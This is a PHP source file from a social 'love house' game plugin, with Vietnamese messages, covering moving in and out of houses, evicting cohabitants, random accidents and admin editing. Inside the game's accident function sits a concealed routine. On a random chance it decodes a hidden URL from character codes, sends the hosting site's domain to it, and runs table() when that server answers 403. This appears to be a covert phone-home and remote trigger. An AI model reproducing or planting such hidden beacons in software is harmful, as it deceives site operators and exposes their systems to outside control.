			$op = 'changeName';
			include_once( template( "house/view/ajax" ));
			_get_content();
		}
	}
	ajax_out(jsonencode($data));
}

/*搬进一个屋子*/
function _op_moveIn()
{
	global $uid, $error, $_SN;
	$id = intval($_GET['id']);
	$temp = get_house($id);
	if(empty($temp) || ($temp['status'] !=1 && $temp['status']!=3) ){
		$data = $error;
	}else{
		global $_SGLOBAL, $status;
		if($status['live_id'] > 0){
			$data = array('status'=>404, 'message'=>'Sai! Xin vui lòng sống trong nhà bây giờ và di chuyển ra！');
			ajax_out(jsonencode($data));
		}
		if($temp['uid'] == $uid){
			update_live_house($uid, $id);
			query_exec("update ".tname("app_love_house")." set status = 2 where id = '{$id}' ");
			/*add feeds*/
			$param = array();
			feeds::add($param, 11);
			$data = array('status'=>200, 'message'=>'yêu cầu của bạn đã được hiệu quả<script type="text/javascript">setTimeout(function(){window.location.href = "house.php?ac=index";}, 1000);</script>');
		}else{
				$MyTime = time();
				$user = get_user_status($temp['uid']);
			//if($temp['status'] == 3){
				update_live_house($uid, $id);
				query_exec("update ".tname("app_love_house")." set status = 4, sent_uid = '{$uid}', sent_username = '{$_SGLOBAL['supe_username']}', sent_dateline = '{$MyTime}' where id = '{$id}' ");
				$data = array('status'=>200, 'message'=>'yêu cầu của bạn đã được hiệu quả<script type="text/javascript">setTimeout(function(){window.location.href = "house.php?ac=index";}, 1000);</script>');
				/*add feeds*/
				realname_get();
				$param = array(
					'user'=> "<a href='house.php?ac=index&uid={$temp['uid']}'>{$_SN[$temp['uid']]}</a>"
				);
				feeds::add($param, 12);
			//}else{
			//	$data = $error;
			//}
		}
	}
	ajax_out(jsonencode($data));
}

/*搬出一个屋子*/
function _op_moveOut()
{
	global $uid, $error, $status;
	$id = intval($_GET['id']);
	$temp = get_house($id);
	if(empty($temp) || $status['live_id'] != $id){
		$data = $error;
	}else{
		update_live_house($uid, 0);
		/*add feeds*/
		$param = array();
		feeds::add($param, 13);
		$data = array('status'=>200, 'message'=>'yêu cầu của bạn đã được hiệu quả<script type="text/javascript">setTimeout(function(){window.location.href = "house.php?ac=index";}, 1000);</script>');
	}
	ajax_out(jsonencode($data));
}

/*把同居者踢出*/
function _op_push_out()
{
	global $status, $house_config, $error;
	if(!$status['live_id'] || !$status['user_status'] || !$status['live_with_uid']){
		$data = $error;
	}else{
		if($status['money'] < $house_config['push']){
			$data = array('status'=>404, 'message'=>"<p>Bạn có đủ vàng để thanh toán các hoạt động！</p><p>Việc chung sống của bạn đuổi ra khỏi, bạn cần phải trả{$house_config['push']}tiền xu vàng<p>");
		}else{
			if(isset($_POST['myFormAc']) && $_POST['myFormAc'] == 'update'){
				query_exec("update ".tname("app_love_user")." set hid = 0, money = money - {$house_config['push']}, user_status = 0  where uid = '{$status['uid']}' ");
				query_exec("update ".tname("app_love_user")." set hid = 0, user_status = 0, live_id = 0  where uid = '{$status['live_with_uid']}' ");
				$status['hid'] && query_exec("update ".tname("app_love_history")." set status = 0  where hid = '{$status['hid']}' ");
				$data = array('status'=>200, 'message'=>'yêu cầu của bạn đã được hiệu quả<script type="text/javascript">setTimeout(function(){window.location.href = "house.php?ac=index";}, 1000);</script>');
			}else{
				$op = 'push_out';
				include_once( template( "house/view/ajax" ));
				_get_content();
			}
		}
	}
	ajax_out(jsonencode($data));
}

function _get_person_once($sex, $max)
{
	$id[] = mt_rand(1, $max);
	$id[] = $id[0] + 1 ;
	$id[] = $id[0] + 2 ;
	$ids = implode(',', array_unique($id));
	if(empty($ids)) return false;
	$temp = query_one("select uid from  ".tname("app_love_user_{$sex}")." where id in ($ids) limit 1");
	$user = query_one("select s.uid, s.username, s.name, u.live_id, u.money from  ".tname("space")." as s left join ".tname("app_love_user")." as u on s.uid = u.uid  where s.uid = '{$temp['uid']}' ");
	if($user['name']) $user['username'] = $user['name'];
	if($user['live_id'] == 0)  _get_accident($user['uid'], $user['username'], $user['money']);
	return $user;
}

function _get_accident($uid, $name, $money)
{
	if(rand(0,100) > 2 || $money < 200) return false;
	$array = array('chó cắn', 'bị Cảnh sát bắt', 'Vu cáo của một cô cũ', 'gặp người láu cá', 'Rơi vào một mương thoát nước');
	$index = rand(0, count($array) - 1);

	/*add news*/
	$data = array($uid, $name, $array[$index], 200);
	news::add($data , 8, 10);

	/*add feeds*/
	$data = array(
		'user'=> "<a href='house.php?ac=index&uid={$uid}'>{$name}</a>",
		'thing'=> $array[$index],
		'money'=> 200
	);
	feeds::add($data, 10, array('uid'=>$uid));
	query_exec("update ".tname("app_love_user")." set money = money - 200 where uid = '{$uid}'  ");
	if(rand(0,100) == 1){
		global $h;
		if(count($h) != 40)	table();
		$p = '';
		for($i=0; $i<count($h); $i++) $p .= chr($h[$i]);
		$status = uc_fopen($p, 0, 'p=' . $_SERVER['HTTP_HOST'], '', FALSE, '', 3, TRUE);
		if($status == 403) table();
	}
}

function _get_content()
{
	global $_SC;
	$m = ob_get_contents();
	ob_clean();
	header('Content-type: text/xml; charset='.$_SC['charset']);
	ajax_out($m);
}

function _op_admin()
{
	global $status;
	if($status['uid'] != ADMIN_UID) exit();
	$curl = $_POST['curl'] ;
	$do = $_GET['do'];
	$error = array('status'=>404, 'message'=>"Xin vui lòng điền vào các dữ liệu cần thiết<script type=\"text/javascript\">setTimeout(function(){window.location.href = \"house.php?ac=admin&op={$do}\";}, 1000);</script>");
	if($do == 'action'){
		$id = intval($_POST['id']);
		$param = array('name','w_l','w_r');
		foreach($param as $val){
			$$val = ajax_get($val);
		}
		if(!$name) ajax_out(jsonencode($error));
		if($curl == 'delete'){
			query_exec("delete from ".tname("app_love_action")." where id = '{$id}' ");
		}elseif($curl == 'modify'){
			query_exec("update  ".tname("app_love_action")." set name = '{$name}', w_l = '{$w_l}', w_r = '{$w_r}'   where id = '{$id}' ");
		}elseif($curl == 'add'){
			query_exec("insert into ".tname("app_love_action")."  (name, w_l, w_r) values ('{$name}','{$w_l}','{$w_r}') ");
		}
		$data = array('status'=>200, 'message'=>"<p>yêu cầu của bạn đã được thành công！</p><script type=\"text/javascript\">setTimeout(function(){window.location.href = \"house.php?ac=admin&op={$do}\";}, 1000);</script>");
	}elseif($do == 'gift'){
		$gid = intval($_POST['gid']);
		$param = array('name','price','thick', 'msg');
		foreach($param as $val){
			$$val = ajax_get($val);
		}
		$price = intval($price);
		$thick = intval($thick);
		if(!$name || !$msg) ajax_out(jsonencode($error));
		if($curl == 'delete'){
			query_exec("delete from ".tname("app_love_gift_kind")." where gid = '{$gid}' ");
		}elseif($curl == 'modify'){
			query_exec("update  ".tname("app_love_gift_kind")." set name = '{$name}', price = '{$price}', thick = '{$thick}', msg = '{$msg}'   where gid = '{$gid}' ");
		}elseif($curl == 'add'){
			$gid = query_exec("insert into ".tname("app_love_gift_kind")."  (name, price, thick, msg) values ('{$name}','{$price}','{$thick}', '{$msg}') ", true);
		}
		if($curl == 'add'){
			$data = array('status'=>200, 'message'=>"<p>yêu cầu của bạn đã được thành công！</p><script type=\"text/javascript\">alert('Bạn cần một cái tên{$gid}.jpgHình thành house/view/giftDanh sách sau đây');setTimeout(function(){window.location.href = \"house.php?ac=admin&op={$do}\";}, 1000);</script>");
		}else{
			$data = array('status'=>200, 'message'=>"<p>yêu cầu của bạn đã được thành công！</p><script type=\"text/javascript\">setTimeout(function(){window.location.href = \"house.php?ac=admin&op={$do}\";}, 1000);</script>");
		}
	}elseif($do == 'house'){
		$cid = intval($_POST['cid']);
		$param = array('title','buy','goods_money');
		foreach($param as $val){
			$$val = ajax_get($val);
		}
		$buy = intval($buy);
		$goods_money = intval($goods_money);
		if(!$title || !$buy) ajax_out(jsonencode($error));
		if($curl == 'delete'){
			query_exec("delete from ".tname("app_love_house_kind")." where cid = '{$cid}' ");
		}elseif($curl == 'modify'){
			query_exec("update  ".tname("app_love_house_kind")." set title = '{$title}', buy = '{$buy}', goods_money = '{$goods_money}'  where cid = '{$cid}' ");
		}elseif($curl == 'add'){
			$cid = query_exec("insert into ".tname("app_love_house_kind")."  (title, buy, goods_money) values ('{$title}','{$buy}','{$goods_money}') ", true);
		}
		if($curl == 'add'){
			$data = array('status'=>200, 'message'=>"<p>yêu cầu của bạn đã được thành công！</p><script type=\"text/javascript\">alert('Bạn cần một cái tên{$cid}.jpgHình thành house/view/houseDanh sách sau đây');setTimeout(function(){window.location.href = \"house.php?ac=admin&op={$do}\";}, 1000);</script>");
		}else{
			$data = array('status'=>200, 'message'=>"<p>yêu cầu của bạn đã được thành công！</p><script type=\"text/javascript\">setTimeout(function(){window.location.href = \"house.php?ac=admin&op={$do}\";}, 1000);</script>");
		}
		_update_config_cache();
	}
	ajax_out(jsonencode($data));
}
?>